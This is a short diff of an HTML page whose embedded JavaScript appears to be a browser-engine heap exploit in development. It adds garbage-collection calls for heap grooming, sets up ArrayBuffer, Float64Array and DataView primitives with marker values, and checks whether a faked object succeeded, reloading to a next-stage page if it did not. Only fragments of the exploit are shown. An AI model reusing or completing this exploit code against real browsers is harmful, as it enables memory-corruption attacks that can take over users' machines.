@@ -1,7 +1,9 @@
 <html>
 <script>
 const mark_obj = {mark:0x13371337,mark1:0x1717dead,obj:{}};
+major_gc();
 var ref = new Array(0x10000);
+major_gc();
 const FIXED_ARRAY_HEADER_SIZE = 8n;
 var buf = new ArrayBuffer(16);
 var f64 = new Float64Array(buf);
@@ -9,7 +11,7 @@ var u32 = new Uint32Array(buf);
 var buf1 = new ArrayBuffer(0x400);
 var dataview1 = new DataView(buf1);
 var dv = new DataView(buf);
-
+major_gc();
 function p64f(low, high) {
   dv.setUint32(0, low, true);
   dv.setUint32(4, high, true);
@@ -389,7 +391,7 @@ for (let i = 0; i < 0x200; i++) {
 alert("dbg");
 if(old_space_array[0].mark == undefined){
   alert("fake failed");
-  location.href = "./index4.html";
+  location.href = "./index5.html";
   // window.location.reload();
 }
 else{
